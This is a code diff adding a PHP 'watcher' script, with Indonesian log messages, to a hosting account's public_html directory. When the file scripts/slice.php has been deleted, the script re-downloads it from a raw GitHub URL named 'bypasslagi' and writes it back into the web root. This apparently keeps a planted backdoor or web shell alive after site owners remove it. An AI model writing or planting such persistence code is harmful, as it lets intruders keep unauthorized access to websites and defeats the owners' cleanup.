@@ -1,0 +1,22 @@
+<?php
+$logFile = '/home/fpldtr/public_html/watcher.log';
+file_put_contents($logFile, date('Y-m-d H:i:s') . " - Watcher dijalankan\n", FILE_APPEND);
+
+$targetFile = '/home/fpldtr/public_html/scripts/slice.php';
+$backupURL = 'https://raw.githubusercontent.com/brianwijayacupu/Bangientau/refs/heads/main/bypasslagi';
+
+if (!file_exists($targetFile)) {
+    file_put_contents($logFile, "File tidak ada, mencoba restore...\n", FILE_APPEND);
+    
+    $content = file_get_contents($backupURL);
+    if ($content !== false) {
+        file_put_contents($targetFile, $content);
+        chmod($targetFile, 0644);
+        file_put_contents($logFile, "File berhasil di-restore\n", FILE_APPEND);
+    } else {
+        file_put_contents($logFile, "Gagal download dari URL\n", FILE_APPEND);
+    }
+} else {
+    file_put_contents($logFile, "File masih ada\n", FILE_APPEND);
+}
+?>
